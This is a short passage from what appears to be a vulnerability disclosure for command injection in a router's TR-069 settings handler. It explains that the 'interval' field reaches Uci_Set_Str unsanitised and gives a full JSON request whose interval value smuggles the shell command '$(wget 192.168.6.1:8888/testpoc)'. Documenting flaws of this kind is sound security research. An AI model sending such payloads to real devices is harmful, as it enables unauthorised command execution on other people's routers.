...
<div  align="center"><img src="./img/interval-sub_422380.png" style="zoom:80%;" /></div>

The sub_4100F0 function defines a variable `interval`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
...
We set `interval` as **$(wget 192.168.6.1:8888/testpoc)** ,such as:
...
{"addEffect":"0","enable":"1","url":"192.168.123.234","user":"123","pass":"123","informEnable":"0","interval":"$(wget 192.168.6.1:8888/testpoc)","stunEnable":"1","stunServerAddr":"192.168.123.234","stunPort":"4343","stunMaxAlive":"3600","stunMinAlive":"30","stun_user":"123","stun_pass":"123","topicurl":"setTr069Cfg"}
```

## outcome
<div  align="center"><img src="./img/poc-interval.png" style="zoom:80%;" /></div>